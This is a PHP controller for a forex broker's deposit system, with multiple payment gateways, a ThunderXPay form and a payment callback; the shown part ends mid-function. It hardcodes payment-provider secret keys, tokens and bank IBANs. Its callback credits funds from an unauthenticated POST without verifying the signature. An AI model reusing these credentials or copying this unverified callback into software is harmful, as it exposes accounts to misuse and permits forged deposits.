<?php

if (!defined('BASEPATH')) {
    exit('No direct script access allowed');
}

class Deposit extends CI_Controller
{
    private $secret_key = '9XKHl3nNp74t';
    private $encrypt_key = '#w6ZaY;XEvxFkh}d';
    private $cardpay_secret_key = 'OWg6n50ma1PH';
    private $cashu_token = 'WNtGmty4XaR3Fu8PXcDy';
    private $cashu_merchant_id = 'FOREXMART';
    private $wallet_id = '4835';
    private $paxum_shared_key = 'a597e50502f5ff68e3e25b9114205d4a';
    private $skrill_secret_key = 'fsokpacwe';
    private $card_pay_status = [
        'declined' => 0,
        'pending' => 1,
        'approved' => 2,
    ];
    private $paysera_status = [
        0 => 0, // payment has not been executed
        2 => 1, // payment order accepted, but not yet executed
        1 => 2, // payment successful
        3 => 3, // additional payment information
    ];
    private $skrill_status = [
        '0' => 0, //pending
        '-2' => 1, //failed
        '2' => 2, //processed
        '-1' => 3, //cancelled
        '1' => 4, //invalid signature
    ];
    private $hipay_status = [
        'nok' => 0, // operation not succeeded
        'waiting' => 1, // operation waiting for an action or pending
        'ok' => 2, // operation succeeded
        'cancel' => 3, // cancellation of the operation
    ];
    private $inpay_status = [
        'pending' => 0, // 	Refund have been created
        'approved' => 1, // Payment has been approved by Inpay
        'sum_to_low' => 2, //Partial amount has been received by Inpay. Warning! No goods should be shipped at this time! An extra parameter is returned in the POST to the Notification Url transfers_sum
        'sum-to-high' => 3, //To large amount has been received by Inpay
        'cancelled' => 4, //invoice has been cancelled
    ];

    private $bank_transfer_accounts = [
        'EUR' => '350721115474',
        'USD' => '350721115490',
        'GBP' => '350721115512',
        'NOK' => '350721115520',
        'SEK' => '350721115539',
        'SGD' => '350721115555',
        'HKD' => '350721115598',
        'AUD' => '350721115628',
        'NZD' => '350721115636',
        'RUB' => '350721115660',
    ];
    private $bank_transfer_iban = [
        'EUR' => 'CY49002001950000357021115474',
        'USD' => 'CY05002001950000357021115490',
        'GBP' => 'CY90002001950000357021115512',
        'NOK' => 'CY68002001950000357021115520',
        'SEK' => 'CY40002001950000357021115539',
        'SGD' => 'CY93002001950000357021115555',
        'HKD' => 'CY96002001950000357021115598',
        'AUD' => 'CY62002001950000357021115628',
        'NZD' => 'CY40002001950000357021115636',
        'RUB' => 'CY71002001950000357021115660',
    ];
    private $comment_type = [
        'deposit' => 'DPST_',
        'withdraw' => 'W/D_',
        'deposit_fee' => 'FEES_',
    ];
    private $comment_transaction_type = [
        'NETELLER' => 'NT_',
        'SKRILL' => 'SK_',
        'CREDIT CARD' => 'CP_',
        'CARDPAY' => 'CP_',
        'UNIONPAY' => 'CUP_',
        'WEBMONEY' => 'WM_',
        'PAXUM' => 'PX_',
        'UKASH' => 'UK_',
        'PAYCO' => 'PC_',
        'FILSPAY' => 'FP_',
        'CASHU' => 'CU_',
        'PAYPAL' => 'PP_',
        'QIWI' => 'qw_',
        'MEGATRANSFER' => 'MT_',
        'MEGATRANSFER_CC' => 'MTCC_',
        'YANDEXMONEY' => 'YAN_',
        'BITCOIN' => 'BITCOIN',
        'TRANSIT_TRANSFER' => 'TR_',
        'FASAPAY' => 'FASAPAY_',
        'EMERCHANTPAY' => 'EPAY_',
        'CHINAUNIONPAY' => 'CUP_',
        'PAYOMA' => 'PAYOMA_',
        'ACCENTPAY' => 'ACCENTPAY_',
        'INPAY' => 'INPAY_',
        'BANK_MYR' => 'BANK_MYR_',
        'BANK_THB' => 'BANK_THB_',
        'BANK_IDR' => 'BANK_IDR_',
        'BANK_VND' => 'BANK_VND_',
        'BANK_MXN' => 'BANK_MXN_',
        'BANK_BRL' => 'BANK_BRL_',
        'BANK_NGN' => 'BANK_NGN_',
        'BANK_KES' => 'BANK_KES_',
        'BANK_UGX' => 'BANK_UGX_',
        'BANK_GHS' => 'BANK_GHS_',
        'ALIPAY' => 'ALIPAY_',
        'ZOTAPAY' => 'ZP_',
        'ZOTAPAY_MYR' => 'ZP_',
        'ZOTAPAY_VND' => 'ZP_',
        'ZOTAPAY_THB' => 'ZP_',
        'ZOTAPAY_IDR' => 'ZP_',
        'ZOTAPAY_CARD' => 'ZPC_',
        'ASIA_VND' => 'ASIA_VND_',
        'NOVA2PAY' => 'NOVA2PAY_',
        'THUNDERXPAY'=>'THUNDERXPAY_'
    ];

    private $paymentType_status = [
        'Deposit via Debit/Credit (CardPay)' => 1,
        'Deposit via Debit/Credit (MegaTransfer)' => 2,
        'Deposit via Bank Transfer' => 3,
        'Deposit via Skrill' => 4,
        'Deposit via Neteller' => 5,
        'Deposit via Paxum' => 6,
        'Deposit via PayPal' => 7,
        'Deposit via WebMoney' => 8,
        'Deposit via PayCo' => 9,
        'Deposit via QIWI' => 10,
        'Deposit via MegaTransfer' => 11,
        'Deposit via Bitcoin' => 12,
        'Deposit via YandexMoney' => 13,
        'Deposit via Moneta' => 14,
        'Deposit via Sofort' => 15,
        'Deposit via Emerchantpay' => 14,
        'Deposit via Fasapay' => 15,
        'Deposit via China Union Pay' => 16,
        'Deposit via Payoma' => 17,
        'Deposit via accentpay' => 18,
        'Deposit via Inpay' => 19,
        'Deposit via bank myr' => 20,
        'Deposit via Alipay' => 21,
        'Deposit via bank thb' => 22,
        'Deposit via bank idr' => 23,
        'Deposit via bank vnd' => 24,
        'Deposit via PaymentAsia vnd' => 25,
        'Deposit via THUNDERXPAY' => 26,
    ];

    private $currency_status = [
        'USD' => 1,
        'EUR' => 2,
        'GBP' => 3,
        'RUR' => 4,
        'RUB' => 4,
        'MYR' => 5,
        'IDR' => 6,
        'THB' => 7,
        'CNY' => 8,
        'Cents' => 9,
        'VND' => 10,
        'LAK' => 11,
        'MMK' => 12,
        'KHR' => 13,
        'ZAR' => 14,
    ];

                            
    
    
    private $isPartner = false;

    public function euRedirect()
    {
        if ($_SERVER['SERVER_NAME'] === 'my.forexmart.com') {
            if ($eu_domain = $this->g_m->showssingle('eu_session_url', 'account_number', $this->session->userdata('account_number'), '*')) {
                $this->g_m->delete('eu_session_url', 'account_number', $this->session->userdata('account_number'));
                redirect('https://my.forexmart.eu/'.$eu_domain['url']);
            }
        }
    }

    public function __construct()
    {
        parent::__construct();
//        FXPP::preventPost(); // only for read only mode

        $this->load->helper('url');
        $this->load->model('deposit_model');
        $this->load->model('account_model');
        $this->load->model('partners_model');
        $this->load->model('user_model');
        $this->load->model('General_model');
        $this->load->model('Withdraw_model');
        $this->load->model('withdraw_model');
        $this->load->library('Transaction');
        $this->g_m = $this->General_model;
        $this->load->helper('cookie');
        $this->load->helper('cms');
        //  $this->pageVisitor(); // page monitoring
        $isPartner = $this->session->userdata('login_type');
        if ($isPartner == 1) {
            $this->isPartner = true;


            
        }
        $this->lang->load('deposit');
        $this->lang->load('withdraw');
        $this->lang->load('its');
        $this->lang->load('modal_message');
        $this->lang->load('transfer');
        $this->lang->load('currenttrades_lang');
        // $deposit_url = $this->hasAccessDeposit();
        // if ($deposit_url) {
        //     redirect('withdraw');
        // }

        if (isset($_COOKIE['enable_profiler'])) {
            $this->output->enable_profiler(true);
        }
        
        
        
        
    }

    public function extra()
    {
        //FXPP::extraCommission(111947,50,4514281);
    }

    public function index()
    {
        $this->deposit_finance_v2();

        /*$this->load->library('IPLoc',x null);*/
        //  if(IPLoc::Office_and_Vpn()){

        // if ($this->session->userdata('login_type') == 1) {
        //     $this->deposit_finance_for_partners();
        // } else {
        //     if (FXPP::isAccountFromEUCountry() || FXPP::fmGroupType($_SESSION['account_number']) == 'ForexMart Pro') {
        //         $this->deposit_finance_for_partners();

        //     } else {
        //         $user_id = $this->session->userdata('user_id');
        //         $mtas3 = $this->general_model->showssingle($table = 'users', $id = 'id', $field = $user_id, $select = 'login_type');
        //         $login_type = $mtas3['login_type'];
        //         $this->deposit_finance();
        //     }

        // }

        //  $this->deposit_finance_for_partners();

        /* }else{
                $user_id = $this->session->userdata('user_id');
                $mtas3 = $this->general_model->showssingle($table='users',$id='id', $field=$user_id,$select='login_type');
                $login_type = $mtas3['login_type'];
                $this->deposit_finance();
            //$this->depositPage();
        }
        */
    }


    
  public function thunderXPay()
    {
                        
       
        if ($this->session->userdata('logged')) {

           
            if(!FXPP::thunderXpayAllow()){
                redirect('deposit/');
            }
            
                        
          $this->load->library('thunder');
            
                
          
            $data['minimum_deposit']=$this->thunder->minimum_limit_per_transaction();
            $data['maximum_deposit']=$this->thunder->maximum_limit_per_transaction();

            $account_number = $this->session->userdata('account_number'); 
            $user_id = $this->session->userdata('user_id');        
            
            $data['error_msg'] = $this->updated_deposit_validation($user_id);                
            $user_data = $this->general_model->userAccountDetails($user_id);
            
            
            $data['bonus'] = $this->input->get('bonus', true); 
            $data['addBonus'] = $this->input->get('addBonus', true);
            $data['amount1'] = $this->input->get('amount1', true);
            $data['type'] = strtolower($this->input->get('type', true));
            $data['file_upload_status']=0;  //0=>default, 1=>success,2=>failed              
           $data['deposit_status']=false;              
            
            $walletCurrency = $this->input->post('currency', true).'-'.$this->input->post('bank_code', true);
           
            
            
            $this->form_validation->set_rules('amount', 'Amount', "trim|required|xss_clean|non_usd_min_amt_validate_zp[$walletCurrency]");
            $this->form_validation->set_rules('currency', 'Currency', 'trim|required|xss_clean');
            $this->form_validation->set_rules('bank_code', 'Bank name', 'trim|required|xss_clean'); 
            $this->form_validation->set_rules('bank_account_number', 'Bank Account Number', 'trim|required|xss_clean');
            $this->form_validation->set_rules('idcard_number', 'ID Card Number', 'trim|required|xss_clean');
            $this->form_validation->set_rules('person_name', 'Full Name', 'trim|required|xss_clean|chkNameValid');
            $this->form_validation->set_rules('person_email', 'Email', 'trim|required|xss_clean');
            $this->form_validation->set_rules('person_phone', 'Phone Number', 'trim|required|xss_clean|chkTelephoneValid');
            $this->form_validation->set_rules('person_email', 'Email', 'trim|required|xss_clean');

               if(empty($_FILES['card_image']['name']))
                {
                    $this->form_validation->set_rules('card_image', 'Card Image', 'trim|required|xss_clean');
                }
                
                
                

            if ($this->form_validation->run() && !$data['error_msg']) {
                
                            
//additional_tenp_bonus
                            $post_data=array(
                                'amount'=> $this->input->post('amount', true),  
                                'currency'=> $this->input->post('currency', true),
                                'bank_code'=> $this->input->post('bank_code', true),
                                'bank_account_number'=> $this->input->post('bank_account_number', true),
                                'idcard_number'=> $this->input->post('idcard_number', true),
                                'person_name'=> $this->input->post('person_name', true),
                                'person_email'=> $this->input->post('person_email', true),
                                'person_phone'=> $this->input->post('person_phone', true),                    
                                'payment_type'=> strtolower($this->input->post('payment_type', true)),
                                'bonus_type'=> $this->input->post('bonus_type', true),
                                'bonus'=> $this->input->post('bonus', true),
                                'pre_amount'=> $this->input->post('pre_amount', true),
                            );

//
//                            echo "<pre>"; 
//                            echo "__succes validation===> ";  api_url
//                            
//                            prnt_r($_POST);         
                            
                            
                            $pre_amount=($data['amount1'])?$data['amount1']:$post_data['pre_amount'];
                            $payment_type=($data['type'])?$data['type']:$post_data['payment_type'];
                            $bonus_type=($data['bonus'])?$data['bonus']:$post_data['bonus_type'];
                            $bonus=($data['addBonus'])?$data['addBonus']:$post_data['bonus'];


                                $compensation=0;
                                $amount=$post_data['amount'];

//                                if($payment_type=="cc") 
//                                {
//                                      $compensation = 0;
//                                      if(($post_data['currency'] == 'EUR') && IPLoc::isEuropeanCountryByCode($user_data->country)){
//
//                                          $compensation = FXPP::roundno($amount* 0.03, 2); 
//                                          $amount = $amount+ $compensation;
//                                       }
//
//                                }
                                
                            
                            $transaction_code= strtolower($post_data['currency']).uniqid();  
                            $additional_bonus = $this->validateAdditionalBonus($bonus);
                            $upload_file_name=false;   
                            $data['file_upload_status']=2;
                                
                         
              ///   echo "<===========> ";prnt_r($post_data);           exit;           
                            
                             ///     $this->load->library('Thunder');                                

                                    $test_users = unserialize(TEST_USERS_DEPOSIT);
                                    if (in_array($user_id, $test_users)) {
                                        $this->thunder->setAccessType(0); // 0 - test 1 -live
                                    } else {
                                        $this->thunder->setAccessType(1); // 0 - test 1 -live
                                    } 
                            
                                    
                                    
                                    
                                    
                                 //   $this->thunder->setAccessType(0);  // for test enviroment
                 
                
                      /*---------------------------------card image upload start --------------------------*/  

                                 $this->load->helper(array('form', 'url'));
                                 
                                 $base_path= $this->config->item('asset_user_docs');//"assets/user_docs/";
                                 
                                 
                                 
                                $_FILES['userfile']['name']    = $_FILES['card_image']['name'];
                                $_FILES['userfile']['type']    = strtolower($_FILES['card_image']['type']);
                                $_FILES['userfile']['tmp_name'] = $_FILES['card_image']['tmp_name'];
                                $_FILES['userfile']['error']       = $_FILES['card_image']['error'];
                                $_FILES['userfile']['size']    = $_FILES['card_image']['size'];
                                $config['file_name']= "thunder__".$transaction_code."__".$user_id.".png"; //transaction_code__account_number__user_id
                                $config['upload_path'] = $base_path;
                                $config['allowed_types'] = 'JPG|JPEG|jpg|jpeg|png';
                                $config['max_size']      = '10240';
                                $config['max_width']     = '0';
                                $config['max_height']    = '0';
                                $config['overwrite']     = false; //DO NOT CHANGE


                                $this->load->library('upload', $config);
                                $this->upload->initialize($config);
                                
                                             
                                    if($this->upload->do_upload()){

                                        $uploadData = $this->upload->data();
                                        $upload_file_name=$uploadData['file_name'];
                                        $data['file_upload_status']=1;
                                    }  
                                        //
                /*---------------------------------card image upload close --------------------------*/                
                
                
                         
                
                                    
                       if($upload_file_name)         
                       {         
                           
                            
                                
                                 //   $this->load->library('Thunder');                                

                                    $test_users = unserialize(TEST_USERS_DEPOSIT);
                                    $transaction_type=1;
                                    if (in_array($user_id, $test_users)) {
                                        $this->thunder->setAccessType(0); // 0 - test 1 -live
                                        $transaction_type=0;
                                    } else {
                                        $this->thunder->setAccessType(1); // 0 - test 1 -live
                                    }            

                            
                                  
                                    $insertData =array(
                                        'transaction_code' => $transaction_code,
                                        'account_number' => $account_number,
                                        'pre_amount' => $pre_amount,
                                        'payment_type' => ($payment_type == 'cc') ? 1 : 0,
                                        'bonus_type' => $bonus_type,
                                        'bonus' => $bonus,
                                        'additional_temp_bonus' => $additional_bonus,

                                        'deposit_amount' => $amount,
                                        'extra_compensation' => $compensation,
                                        'currency' => $post_data['currency'],

                                        'bank_code' => $post_data['bank_code'],
                                        'bank_account_number' => $post_data['bank_account_number'],
                                        'idcard_number' => $post_data['idcard_number'],
                                        'card_image' => $upload_file_name,

                                        'person_name' => $post_data['person_name'],
                                        'person_email' => $post_data['person_email'],
                                        'person_phone' => $post_data['person_phone'],

                                        'ip_address'=>$this->input->ip_address(),
                                        'user_id' => $user_id,
                                        'create_date' => date('Y-m-d h:i:s'),
                                        'transaction_type'=>$transaction_type
                                        );

                            

                                    
                                      $this->general_model->insertmy('thunder_xpay_deposit', $insertData);

                                      
                                      $base_card_img=array(
                                        "base_card_image"=>base64_encode($base_path.$upload_file_name)  
                                      );
                                      
                                        
                                      
                                      $auth_data=$this->thunder->getAuthData(); 
                                      
                                      
                                      $payment_data=array_merge($insertData,$auth_data,$base_card_img);
                                      
                                      
//echo "<pre>"; print_r($payment_data);exit;
                                    
                                      
                                      $this->load->view('deposits/thunderx_pay_payment', $payment_data);


                       }
                                        
               

            }else{
                
                            
                            
            
            
//            if(isset($_POST['bank_code'])){
//                echo "<pre>"; echo "not validation===> ";
//                 echo validation_errors(); 
//                 
//                 prnt_r($_POST);           exit;
//            }
//            
            
                
                $data['deposit_status'] = $this->input->get('status');
                
                            
            
                $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

                $data['metadata_description'] = 'Provide the necessary information to deposit via ThunderXPay. Request is processed within 24 hours.';
                $data['input_account_number'] =FXPP::inputAccountNumberWithBalance2($user_data->account_number, $user_data->currency); 

                $data['user_currency'] =$user_data->currency;            
                $data['allow_country'] = true;
                $data['hasState'] = false;




                $view = 'deposits/thunderx_pay';

                $this->template->title('ForexMart | Deposit - ThunderXPay')
                    ->set_layout('internal/main')
                    ->append_metadata_css("<link rel='stylesheet' href='".$this->template->Css()."loaders.css'>")
                    ->append_metadata_js("<script src='".$this->template->Js()."custom-deposit.js'></script>")
                    ->build($view, $data);
            
            }
            
        } else {
            redirect('signout');
        }
    }    
    
    
                            
    
public function thunderXPay_return(){
    
$thunder_json_data = file_get_contents('php://input');
    
$thunder_serialize_data=serialize($thunder_json_data);
                            
 //echo "<pre>"; print_r($thunder_json_data);exit;

 if($thunder_json_data!="") 
  {

       $data=json_decode($thunder_json_data); 

       $transaction_status= $data->status;

           $transaction_message= $data->message;
           $transaction_remark= $data->remark;

     $transaction_code= $data->transaction_code;
     $transaction_verify_date= $data->verify_date;
     $transaction_deposit_amount= $data->deposit_amount;    
     $transaction_signature= $data->signature;

     $condition=array('transaction_code'=>$transaction_code);   
    $thunder_store_data=$this->general_model->getQueryOneObject('thunder_xpay_deposit', "*",$condition);


       if(strtoupper($transaction_status)=="AP")
       {



//echo "<pre>"; echo $transaction_status."==============>"; print_r($thunder_store_data);exit;



                             if($thunder_store_data){



                                           $user_id= $thunder_store_data->user_id;
                                           $account_number= $thunder_store_data->account_number;
                                           $deposit_amount= $thunder_store_data->deposit_amount;
                                           $bonus_type= $thunder_store_data->bonus_type;


                                           $pre_amount= $thunder_store_data->pre_amount;
                                           $payment_type= $thunder_store_data->payment_type;

                                           $bonus= $thunder_store_data->bonus;
                                           $additional_temp_bonus= $thunder_store_data->additional_temp_bonus;

                                           $extra_compensation= $thunder_store_data->extra_compensation;
                                           $currency= $thunder_store_data->currency;
                                           $bank_code= $thunder_store_data->bank_code;
                                           $bank_account_number= $thunder_store_data->bank_account_number;
                                           $idcard_number= $thunder_store_data->idcard_number;
                                           $person_name= $thunder_store_data->person_name;
                                           $person_email= $thunder_store_data->person_email;
                                           $person_phone= $thunder_store_data->person_phone;
                                           $card_image= $thunder_store_data->card_image;
                                           
                                             $status= $thunder_store_data->status;



                                           $amount=$deposit_amount;


                                                /* FXPP-6333 */
                                                   $currencyStatus = $this->currency_status[$currency];
                                                   $isMicro = $this->account_model->isMicro($user_id);
                                                   if ($isMicro) {
                                                       $amount *= 100;
                                                       $currencyStatus = $this->currency_status['Cents'];
                                                   }
                                           /* FXPP-6333 */



                                              $conv_amount = $this->get_convert_amount($currency, $amount);       
                                              $additional_bonus = $additional_temp_bonus;

                                             $date = new DateTime();
                                             $order_number = $date->getTimestamp();






                                              $note="THUNDERXPAY Deposit amuont: ".$transaction_deposit_amount." signature :".$transaction_signature;

                                               $payment_data = [
                                                   'transaction_id' => $transaction_code,
                                                   'reference_id' => $order_number,
                                                   'status' => 2,
                                                   'amount' => $amount,
                                                   'currency' => $currency,
                                                   'user_id' => $user_id,
                                                   'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                                                   'note' => $note,
                                                   'transaction_type' =>'THUNDERXPAY',
                                                   'conv_amount' => $conv_amount,
                                                   'tenpercentbonus'=>0,
                                                   'twentypercentbonus'=>0,
                                                   'thirtypercentbonus'=>0,
                                                   'fiftypercentbonus'=>0,
                                                   'hundredpercentbonus'=>0 
                                               ];  





                                               if ($additional_bonus) {
                                                   $payment_data['tenpercentbonus'] = 1;
                                               }

                                               if ($bonus_type == 'twpb') {
                                                   $payment_data['twentypercentbonus'] = 1;
                                               }

                                               if ($bonus_type== 'tpb') {
                                                   $payment_data['thirtypercentbonus'] = 1;
                                               }

                                               if ($bonus_type == 'fpb') {
                                                   $payment_data['fiftypercentbonus'] = 1;
                                               }
                                               if ($bonus_type == 'hpb') {
                                                   $payment_data['hundredpercentbonus'] = 1;
                                               }



                      if($status!=1)
                      {   

                                     /*================= main deposit start=========================*/
                                               
                                               

                                                 $check_depoisit_queue = [
                                                               'transaction_id' => $payment_data['transaction_id'],
                                                               'transaction_type' => 'THUNDERXPAY',
                                                           ];
                                                $check_depoisit_queue_data= $this->general_model->whereCondition('deposit_queue', $check_depoisit_queue);


                                              $IsInsertedPaymentQueue=false;  

                                               if(!$check_depoisit_queue_data)
                                               {
                                                   $IsInsertedPaymentQueue = $this->deposit_model->insertPaymentQueue($payment_data);
                                               }



                                               if(!$IsInsertedPaymentQueue and !$check_depoisit_queue_data) {

                                                   $asset_user_docs=$this->config->item('asset_user_docs');
                                                   $mgs_data=" deposit queue insert data failed details:".$thunder_serialize_data;
                                                   
                                                   file_put_contents($asset_user_docs.'thunderxpay.log', $mgs_data.PHP_EOL, FILE_APPEND);
                                               } 
                                             
                                               
                                               
                                             
                                               
                                             
                                               
                                               
                                                               $this->load->library('thunder');

                                                               $fee_amount=0; 

                                                               $fee_amount=$this->thunder->getFee($amount,"d");
                                                               $conv_amount_fee = $this->get_convert_amount($currency, $fee_amount);





                                                            $deposit_insert_data=array(                                                   
                                                                 'transaction_id'=>$payment_data['transaction_id'],
                                                                 'reference_id'=>$payment_data['reference_id'],
                                                                 'status'=>$payment_data['status'],
                                                                 'amount'=>$payment_data['amount'],
                                                                 'conv_amount'=>$payment_data['conv_amount'],
                                                                 'currency'=>$payment_data['currency'],
                                                                 'user_id'=>$payment_data['user_id'],
                                                                 'payment_date'=>$payment_data['payment_date'],
                                                                 'note'=>$payment_data['note'],
                                                                 'transaction_type'=>$payment_data['transaction_type'],
                                                                 'tenpercentbonus'=>$payment_data['tenpercentbonus'],
                                                                 'twentypercentbonus'=>$payment_data['twentypercentbonus'],                                                   
                                                                 'thirtypercentbonus'=>$payment_data['thirtypercentbonus'],
                                                                 'fiftypercentbonus'=>$payment_data['fiftypercentbonus'],
                                                                 'hundredpercentbonus'=>$payment_data['hundredpercentbonus'],
                                                                 'bonus_location'=>0,
                                                                 'isDeposit'=>0,
                                                                 'mt_ticket'=>0                                                    
                                                            );

                                                           
                                                            
                                                            $deposit_insert_fee_data=array(                                                   
                                                                 'transaction_id'=>$payment_data['transaction_id'],
                                                                 'reference_id'=>$payment_data['reference_id'],
                                                                 'status'=>$payment_data['status'],
                                                                 'amount'=>$fee_amount,
                                                                 'conv_amount'=>$conv_amount_fee,
                                                                 'currency'=>$payment_data['currency'],
                                                                 'user_id'=>$payment_data['user_id'],
                                                                 'payment_date'=>$payment_data['payment_date'],
                                                                 'note'=>$payment_data['note'],
                                                                 'transaction_type'=>$payment_data['transaction_type'],
                                                                 'mt_ticket'=>0                                                    
                                                            );




                                                             $deposit_failed=array(
                                                                 'transaction_id'=>$payment_data['transaction_id'],
                                                                 'reference_id'=>$payment_data['reference_id'],
                                                                 'status'=>0, // failed deposit in our system [0=>failed,1=>success]
                                                                 'amount'=>$amount,
                                                                 'currency'=>$currency,
                                                                 'user_id'=>$user_id,
                                                                 'payment_date'=> date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                                                                 'transaction_type'=>$payment_data['transaction_type'],
                                                                 'mt_ticket'=>'',
                                                                 'conv_amount'=>$conv_amount,
                                                                 'payment_status'=> $this->paymentType_status['Deposit via THUNDERXPAY'], //FXPP-7618
                                                                 'currency_status'=> $currencyStatus, //FXPP-761
                                                                 'fee'=>$fee_amount,
                                                                 'isFailed'=>0, // failed deposit in our system [0=>failed,1=>success]
                                                                 'type'=>'Deposit-'.$isMicro.'-THUNDERXPAY',
                                                                 'comment'=>'',
                                                                 'details'=>''

                                                            );

                            
                                          //  echo "<pre>"; echo $IsInsertedPaymentQueue."==============>"; print_r($payment_data);exit;                   
                                                             

                                                             $isInsertPayment = false;

                                                                $WebServiceNew = FXPP::DepositRealFund($account_number, $amount, $this->comment_type['deposit'].$this->comment_transaction_type['THUNDERXPAY'].$payment_data['transaction_id']);
                                                                $requestResult = $WebServiceNew['requestResult'];
                                                                $mt_ticket = $WebServiceNew['ticket'];


                                                                  $totalAmount = $amount + $fee_amount;

                                                                 
                                                                    $isbonusten = false;
                                                                    $isbonustwenty = false;
                                                                    $isbonusthirty = false;
                                                                    $isbonusfifty = false;
                                                                    $isbonushundred = false;


                                                                 

                                                                  if($requestResult === 'RET_OK') 
                                                                  {

                                                                      $deposit_insert_data['mt_ticket']=$mt_ticket;
                                                                      $isInsertPayment = $this->deposit_model->insertPayment($deposit_insert_data);

                                                                        // Back Agent of Client

                            

                                                                        if ($deposit_insert_data['tenpercentbonus'] == 1) {
                                                                            $isbonusten = true;
                                                                            self::applyDepositBonus($user_id, $account_number, $totalAmount, 'THUNDERXPAY', 'tenpb', $deposit_insert_data['transaction_id'], true);
                                                                        }

                                                                        if ($deposit_insert_data['twentypercentbonus'] == 1) {
                                                                            $isbonustwenty = true;
                                                                            self::applyDepositBonus($user_id, $account_number, $totalAmount, 'THUNDERXPAY', 'twpb', $deposit_insert_data['transaction_id'], false);
                                                                        }


                                                                        if ($deposit_insert_data['thirtypercentbonus'] == 1) {
                                                                            $isbonusthirty = true;
                                                                        }
                                                                        if ($deposit_insert_data['fiftypercentbonus'] == 1) {
                                                                            $isbonusfifty = true;
                                                                        }
                                                                        if ($deposit_insert_data['hundredpercentbonus'] == 1) {
                                                                            $isbonushundred = true;
                                                                        }



                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                    if($fee_amount>0)
                                                                    {

                                                                        $WebServiceNewFee = FXPP::DepositRealFund($account_number, $fee_amount, $this->comment_type['deposit_fee'].$this->comment_transaction_type['THUNDERXPAY'].$deposit_insert_data['transaction_id']);
                                                                        $requestResultFee = $WebServiceNewFee['requestResult'];


                                                                        if ($requestResultFee === 'RET_OK') {

                                                                             $fee_mt_ticket = $requestResultFee['ticket'];                            
                                                                             $deposit_insert_fee_data['mt_ticket']=$fee_mt_ticket;  
                                                                            $isInsertPayment = $this->deposit_model->insertPayment($deposit_insert_fee_data);


                                                                        } else {
                                                                            $deposit_failed['comment'] = $requestResult;
                                                                            $deposit_failed['details'] = "Depoist fee failed from API ";
                                                                            $this->general_model->insert('no_status_transaction', $deposit_failed);
                                                                        }
                                                                    }



                                                                 
                                                                 /*---------------------------------------------------------------------*/
                                                                 

                                                                        $processed_amount = floatval($conv_amount) + floatval($conv_amount_fee);



                                                                            /**  Use original amount for Cent accounts**/
                                                                            $isMicro = $this->account_model->isMicro($user_id);
                                                                            if ($isMicro) {
                                                                                $processed_amount /= 100;
                                                                            }
                                                                            /**End**/

                                                                            /* Send successful email deposit to auto-reports **/
                                                                            $this->sendEmailAfterSuccessDeposit('THUNDERXPAY', $processed_amount, $account_number, $user_id, $this->comment_type['deposit'].$this->comment_transaction_type['THUNDERXPAY'].$deposit_insert_data['transaction_id']);


                                                                          if(!$isInsertPayment)
                                                                          {

                                                                               $asset_user_docs=$this->config->item('asset_user_docs');
                                                                               file_put_contents($asset_user_docs.'thunderxpay.log', $thunder_serialize_data.PHP_EOL, FILE_APPEND);
                                                                               
                                                                               
                                                                               
                                                                                        $details=array(
                                                                                            "payment_method"=>$thunder_serialize_data,
                                                                                            "api_depoist_mgs"=>"API or Deposit table data not insert",
                                                                                        );
                                                                               
                                                                                   $data_insert=array(
                                                                                            'transection_method'=>'thundexpay',
                                                                                            'data_serialize'=>json_encode($details),
                                                                                            'created_date'=>date('Y-m-d H:i:s')
                                                                                         );
                                                                                     $this->general_model->insert('deposit_failed_logs',$data_insert);
            
                                                                               

                                                                          }  



                                                                            FXPP::updateAccountTradingStatus($account_number, $user_id, $totalAmount); // for pro accounts


                                                                          if ($isbonustwenty == true) {                                                  

                                                                                //    self::applyDepositBonus($user_id, $account_number, $totalAmount, 'THUNDERXPAY', 'twpb', $deposit_insert_data['transaction_id'], false);
                                                                           }

                                                                         if ($isbonusthirty == true) {                                                 

                                                                              self::applyDepositBonus($user_id, $account_number, $totalAmount, 'THUNDERXPAY', 'tpb', $deposit_insert_data['transaction_id'], false);
                                                                          }

                                                                          if ($isbonusfifty == true) {                                                  

                                                                              self::applyDepositBonus($user_id, $account['account_number'], $totalAmount, 'THUNDERXPAY', 'fpb', $deposit_insert_data['transaction_id'], false);
                                                                         }


                                                                         if ($isbonushundred == true) {                                                

                                                                            self::applyDepositBonus($user_id, $account['account_number'], $totalAmount, 'THUNDERXPAY', 'hplb', $deposit_insert_data['transaction_id'], false);
                                                                         }
                                                                        
                                                                        
                                                                         
                                                                         
                                                                         
                                                                            $success_mgs="Your deposit successfully done. <br>  Amount: ".$amount." <br>  Transaction code is :".$transaction_code."";
                                                                         
                                                                         
                                                                         
                                                                         
                                                                            
                                                                            
                                                                         
                                                                         $sub_data=array(
                                                                               'message'=>$success_mgs,
                                                                               'details'=>$thunder_serialize_data,
                                                                               'text'=>'API approve transection'
                                                                           )  ;

                                                                           $previouse_store_data_not_found=array(    
                                                                               'api_data'=>json_encode($sub_data),
                                                                               'status'=>1
                                                                           ) ;       


                                                                           $this->general_model->updatemy('thunder_xpay_deposit','transaction_code',$transaction_code,$previouse_store_data_not_found);

                                                                         
                            

                                                                        
                                                                        
                                                                      
                                                                        
                                                                        // echo $success_mgs."==================>";exit;
                                                                        
                                                                       $this->session->set_flashdata('thundexpay_deposit', ' Transaction code is :'.$transaction_code);   
                                                                       redirect(base_url('deposit/thunderXPay?status=success'));    
                                                                        
                                                                        
                                                                        


                                                                } else {
                                                                    
                                                                    
                                                                    $deposit_failed['comment'] = $requestResult;
                                                                     $deposit_failed['details'] = "Depoist failed from API ";
                                                                    $this->general_model->insert('no_status_transaction', $deposit_failed);
                                                                    
                                                                    
                                                                    
                                                                    
                                                                      $sub_data=array(
                                                                            'message'=>"Depoist failed from API ".$transaction_code,
                                                                            'details'=>$thunder_serialize_data,
                                                                            'text'=>'Payment method approve transection'
                                                                        )  ;

                                                                        $previouse_store_data_not_found=array(    
                                                                            'api_data'=>json_encode($sub_data),
                                                                            'status'=>2
                                                                        ) ;       


                                                                        $this->general_model->updatemy('thunder_xpay_deposit','transaction_code',$transaction_code,$previouse_store_data_not_found);


                                                                    
                                                                    
                                                                    
                                                                    
                                                                    $this->session->set_flashdata('thundexpay_deposit', 'Internal API error Please communicate Forexmart Support team. <br> Transaction code is :'.$transaction_code);   
                                                                    redirect(base_url('deposit/thunderXPay?status=failed'));   
                                                                    
                                                                    
                                                                }

                            

                                                                
